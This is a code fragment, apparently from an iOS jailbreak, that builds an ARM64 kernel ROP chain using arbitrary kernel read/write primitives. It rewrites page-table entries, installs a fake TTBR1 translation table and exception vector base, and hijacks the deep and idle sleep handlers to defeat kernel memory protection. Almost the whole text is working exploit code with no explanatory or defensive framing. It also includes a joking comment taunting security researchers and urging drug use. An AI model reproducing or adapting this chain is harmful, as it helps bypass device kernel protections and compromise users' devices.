    checkvad();
    /*
     ttbrmagic: prepare rel area
     */
    uint64_t amfi_shellcode = 0;
    uint64_t hidevirt = 0;
    uint64_t level2_fake = physalloc(0x4000);
    char opcode_map = 0;
    if (G(TTBRMAGIC_ENTRYF)) {
        /*
         
         ROP Insanity.
         
         Message to security researchers, feds and apple employees:
         
         If you want to understand this, you have to hit a blunt.
         I don't care if you're at work. Roll a fat one and smoke it. Right now.
         
         If your boss questions this, feel free to tell him to contact me. I'll explain how crucial THC is for this shit.
         
         */
        NSLog(@"found memprot device");
        uint64_t loadstruct = 0;
        
        if(G(47)) {
            loadstruct = G(TTBRMAGIC_ENTRYF) + slide;
        } else {
            loadstruct = ReadAnywhere64(G(TTBRMAGIC_ENTRYF) + slide) - gPhysBase + gVirtBase;
        }
        
        vm_address_t rel_map = physalloc(0x8000);
        vm_address_t x0_map = physalloc(0x10000);
        vm_address_t x8_map = physalloc(0x10000);

        
        vm_address_t gadget0_off = G(GADGET0_PTR) & 0x3FFF;
        vm_address_t reloff = (G(GADGET0_X8REL) & (~0x3FFF)) - (G(GADGET0_PTR) & (~0x3fff));
        
        NSLog(@"reloff %llx", reloff);
        
        vm_offset_t vmoff = G(GADGET0_X8REL) & 0x3FFF;
        vm_address_t x8_rel_p = rel_map + vmoff;
        vmoff = G(GADGET0_NEXT) & 0x3FFF;
        
        WriteAnywhere64(x8_rel_p+0x30, x0_map); // x0 value
        WriteAnywhere64(rel_map+vmoff, G(GADGET1_PTR)+slide); // next gadget
        
        NSLog(@"here");
        sleep(1);
        
        for (int i = 0; i < 0x20; i++) {
            WriteAnywhere64(x0_map + i*0x8, x8_map + i*0x120);
            WriteAnywhere64(x8_map + i*0x120 + 0xc8, G(GADGET2_PTR)+slide); // next gadget
            WriteAnywhere64(x8_map + i*0x120 + 0x110, G(GADGET3_PTR)+8+slide); // next gadget
            WriteAnywhere64(x8_map + i*0x120 + 0xa0, G(GADGET1_PTR)+slide); // next gadget
            WriteAnywhere64(x8_map + i*0x120 + 0x30, x0_map + (i+1)*0x8);
        }
        
        uint64_t shift = physalloc(0x4000);
        
        shift += 0x44;
        WriteAnywhere64(x8_map + 0x1f*0x120 + 0x30, shift); // x0
        WriteAnywhere64(shift, shift);
        
        uint64_t chain = physalloc(0x4000);
        uint64_t datasect = physalloc(0x4000);
        
        WriteAnywhere64(shift + 0xc8, G(GADGET4_PTR) + slide); // next gadget
        
        WriteAnywhere64(shift + 0x28, G(GADGET6_PTR) +slide); // next gadget
        WriteAnywhere64(shift + 0x20, shift+0x100); // x0
        WriteAnywhere64(shift + 0x100, shift+0x100); // *x0
        WriteAnywhere64(shift + 0x30, chain + 8); // x1
        WriteAnywhere64(shift + 0x10, 0x1f*80 - 8); // x2
        WriteAnywhere64(shift + 0x18, 0x414141); // x3

        WriteAnywhere64(shift + 0x100 + 120, G(GADGET5_PTR) + slide); // tgt
        WriteAnywhere64(shift + 0x110, G(MEMCPYP) + slide + 4); // jump to

        for (int i = 0; i < 0x4000/8; i++) {
            WriteAnywhere64(chain+i*8, G(GADGET8_PTR)+slide);
        }
        
        WriteAnywhere64(chain+0x1f*80 - 8, 0x4141414141);
        
        uint64_t chainidx = 0;

#define PUSH(x) WriteAnywhere64(chain + ((chainidx++) * 8), x)
        
        WriteAnywhere64(datasect, datasect+0x100);
        WriteAnywhere64(datasect+8, G(GADGET8_PTR)+slide); // < x8
        
        WriteAnywhere64(datasect+0x100+0xa0, G(GADGET4_PTR) + slide);
        WriteAnywhere64(datasect+0x100+0x20, datasect+8); // x0
        WriteAnywhere64(datasect+0x100+0x30, 0); // x1
        WriteAnywhere64(datasect+0x100+0x10, G(GADGET9_PTR) + slide); // x2
        WriteAnywhere64(datasect+0x100+0x18, 0); // w3
        WriteAnywhere64(datasect+0x100+0x28, G(GADGET10_PTR) + slide); // next gadget

        uint64_t ttbr0 = ReadAnywhere64(loadstruct + 0x20) - gPhysBase + gVirtBase;
        uint64_t entry1 = ReadAnywhere64(ttbr0);
        
        uint64_t level2 = TTE_GET(entry1, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase;
        
        vad.vmaddr = 0;
        
        uint64_t entry2 = 0;
        for (int i = 0; i < 0x4000/8; i++) {
            entry2 = ReadAnywhere64(level2 + i*8);
            vad.vm_info.level2_index = i;
            if (entry2) {
                break;
            }
        }
        
        uint64_t phyzb = vad.vmaddr;
        uint64_t level3 = TTE_GET(entry2, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase;
        
        uint64_t entry3 = 0;
        uint64_t entry3_off = 0;
        for (int i = 0; i < 0x4000/8; i++) {
            entry3 = ReadAnywhere64(level3 + i*8);
            entry3_off = i*8;
            if (entry3) {
                break;
            }
        }
        
        uint64_t entry3_n = entry3;
        TTE_SET(entry3_n, TTE_PHYS_VALUE_MASK, (G(GADGET0_PTR) & (~0x3FFF)) + slide - gVirtBase + gPhysBase);
        WriteAnywhere64(level3, entry3_n);
        TTE_SET(entry3_n, TTE_PHYS_VALUE_MASK, (G(GADGET0_PTR) & (~0x3FFF)) + slide - gVirtBase + gPhysBase + 0x4000);
        WriteAnywhere64(level3+8, entry3_n);
        TTE_SET(entry3_n, TTE_PHYS_VALUE_MASK, (G(PINST)) + slide - gVirtBase + gPhysBase);
        WriteAnywhere64(level3+16, entry3_n);
        
        TTE_SET(entry3_n, TTE_PHYS_VALUE_MASK, findphys_real(rel_map));
        WriteAnywhere64(level3+(((reloff)/0x4000) * 8), entry3_n);
        TTE_SET(entry3_n, TTE_PHYS_VALUE_MASK, findphys_real(rel_map)+0x4000);
        WriteAnywhere64(level3+(((reloff + 0x4000)/0x4000) * 8), entry3_n);
        
        
#define Setup()\
        PUSH(0);\
        PUSH(G(GADGET7_PTR) + slide);\
        PUSH(0);\
        PUSH(datasect);\
        PUSH(0);\
        PUSH(G(GADGET7_PTR) + slide);\
        PUSH(0);\
        PUSH(datasect);\
        PUSH(0);\
        PUSH(G(GADGET3_PTR)+8 + slide);
        
#define SetX0Imm(imm) \
        PUSH(imm + 112); \
        PUSH(G(GADGET11_PTR) + slide); \

        
#define SetX22Imm(imm) \
        SetX0Imm(imm);\
        PUSH(0);\
        PUSH(G(GADGET12_PTR) + slide);\


#define SetX2Imm(imm)\
        PUSH(imm + 64);\
        PUSH(G(GADGET13_PTR) + slide);
        
        
#define CallGadgetRet(addr)\
        SetX2Imm(addr)\
        PUSH(0);\
        PUSH(G(GADGET10_PTR) + slide); // x30
        
        Setup();
        
        SetX22Imm(gVirtBase);
        
        SetX0Imm(G(VBAR)+slide);
        
        CallGadgetRet(phyzb + 0x8008); // set vbar
        
        uint64_t ttbr_fake = physalloc(0x4000);
        
        for (int i = 0; i < 0x4000/8; i++) {
            WriteAnywhere64(ttbr_fake + i * 8, ReadAnywhere64(level1_table + i*8));
        }
        
        uint64_t tte = ReadAnywhere64(ttbr_fake + 8);
        
        uint64_t level2_real = TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase;
        
        for (int i = 0; i < 0x4000/8; i++) {
            WriteAnywhere64(level2_fake + i * 8, ReadAnywhere64(level2_real + i*8));
        }
        
        level1_table = ttbr_fake;

        TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(level2_fake));
        WriteAnywhere64(ttbr_fake + 8, tte);

        SetX0Imm(findphys_real(ttbr_fake));
        
        CallGadgetRet(phyzb + 0x8000); // set ttbr1
        
        PUSH(0);
        PUSH(G(GADGET14_PTR) + slide); // x0 = x21

        SetX2Imm(0x130 - gPhysBase + gVirtBase);
        
        PUSH(0);
        PUSH(G(GADGET16_PTR) + slide); // x0 += x2
        
        PUSH(0);
        PUSH(G(GADGET18_PTR) + slide); // x0 = [x0]
        
        SetX2Imm(0-(((G(TTBRMAGIC_BX0) & (~0xFFF)) + slide)-gVirtBase+gPhysBase) + datasect + 0x200);

        PUSH(0);
        PUSH(G(GADGET16_PTR) + slide); // x0 += x2

        PUSH(0);
        PUSH(G(GADGET18_PTR) + slide); // x0 = [x0]

        WriteAnywhere64(datasect+0x20C, G(GADGET8_PTR)+slide); // ldp x29, x30, [sp], #16; ret
        WriteAnywhere64(datasect+0x200, G(GADGET17_PTR) +slide); // ldp x26, x25, [sp], #80; ret
        
        CallGadgetRet(G(GADGET15_PTR)+slide); // br x0
        
        /*
         nop
         */

        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);

        /*
         deep sleep handler
         */
        PUSH(G(TTBRMAGIC_BX0) + slide + 64);
        PUSH(G(GADGET13_PTR) + slide);
        PUSH(0);
        PUSH(G(GADGET10_PTR) + slide); // x30
        PUSH(0);
        PUSH(G(TTBRMAGIC_ENTRY1) + slide); // x30

        /*
         nop
         */
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);
        
        PUSH(0);
        PUSH(G(GADGET8_PTR)+slide);

        /*
         idle sleep handler
         */
        PUSH(G(TTBRMAGIC_BX0) + slide + 64);
        PUSH(G(GADGET13_PTR) + slide);
        PUSH(0);
        PUSH(G(GADGET10_PTR) + slide); // x30
        PUSH(0);
        PUSH(G(TTBRMAGIC_ENTRY0) + slide); // x30
        
#undef PUSH
        hidevirt = loadstruct + 8;

        opcode_map = 0;
        NSLog(@"enter");
        swritewhere = loadstruct + 8;
        swritewhat = (phyzb+gadget0_off)-(G(TTBRMAGIC_BX0)+slide-gVirtBase); // One Weird Trick [*redacted*] hates
    }
